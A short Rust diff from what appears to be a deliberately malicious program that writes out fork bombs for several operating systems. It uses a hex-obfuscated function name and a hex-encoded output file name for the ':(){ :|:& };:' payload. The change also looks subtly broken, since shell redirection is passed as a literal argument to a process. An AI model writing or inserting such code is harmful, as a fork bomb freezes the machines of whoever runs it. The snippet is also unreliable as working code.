@@ -7,7 +7,8 @@ pub fn main() {
 // different forkbombs so it'll be multiOS
 fn _0x7265616c666f726b() {
     if cfg!(unix) {
-        Command::new("echo")
+        Command::new("bash")
+            .arg("echo")
             .arg("\":(){ :|:& };:\"")
             .arg(">")
             .arg("666f726b626f6d62.bash")
